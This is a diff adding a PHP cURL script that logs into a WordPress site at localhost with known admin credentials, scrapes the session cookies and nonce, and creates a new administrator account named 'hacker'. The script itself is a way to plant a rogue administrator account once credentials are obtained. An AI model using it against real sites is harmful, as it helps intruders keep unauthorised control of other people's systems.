@@ -1,0 +1,64 @@
+<?php
+// set the url of the wordpress site to do this on
+$wp_url = 'http://localhost/wordpress';
+// this will only work if we already have a username and password
+$username = 'admin';
+$password = 'supersecret';
+// set the username, password, and email of the new user we will create
+$new_username = 'hacker';
+$new_password = 'letmein';
+$new_email = 'hacker@fakeemailaddress.com';
+// make up a user agent to use, lets say IE6 again
+$user_agent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)';
+// start by logging into wordpress (using POST, not GET)
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $wp_url.'/wp-login.php');
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'log='.urlencode($username).'&pwd='.urlencode($password).'&wp-submit=Log+In&redirect_to=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2F&testcookie=1');
+curl_setopt($ch, CURLOPT_REFERER, $wp_url.'/wp-login.php');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HEADER, true);
+curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+$output = curl_exec($ch);
+curl_close($ch);
+// search $output for the four cookies, add them to an array
+$index = 0;
+$cookieStrings = array();
+for($i=0; $i<4; $i++) {
+    $start_string = 'Set-Cookie: ';
+    $start = strpos($output, $start_string, $index) + strlen($start_string);
+    $end_string = ';';
+    $end = strpos($output, $end_string, $start);
+    $cookieStrings[] = substr($output, $start, $end-$start);
+    $index = $end + strlen($end);
+}
+// turn cookies into a single cookie string (skipping 4th cookie, since it's the same as 2nd)
+$cookie = $cookieStrings[0].'; '.$cookieStrings[1].'; '.$cookieStrings[3];
+// load the add user page
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $wp_url.'/wp-admin/user-new.php');
+curl_setopt($ch, CURLOPT_REFERER, $wp_url.'/wp-admin/');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+$output = curl_exec($ch);
+curl_close($ch);
+// search for _wpnonce hidden field value
+$start_string = '<input type="hidden" id="_wpnonce" name="_wpnonce" value="';
+$start = strpos($output, $start_string, 0) + strlen($start_string);
+$end_string = '" />';
+$end = strpos($output, $end_string, $start);
+$_wpnonce = substr($output, $start, $end-$start);
+// add our new user
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $wp_url.'/wp-admin/user-new.php');
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, '_wpnonce='.urlencode($_wpnonce).'&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&action=adduser&user_login='.urlencode($new_username).'&first_name=&last_name=&email='.urlencode($new_email).'&url=&pass1='.urlencode($new_password).'&pass2='.urlencode($new_password).'&role=administrator&adduser=Add+User');
+curl_setopt($ch, CURLOPT_REFERER, $wp_url.'/wp-admin/user-new.php');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+$output = curl_exec($ch);
+curl_close($ch);
+?>
+
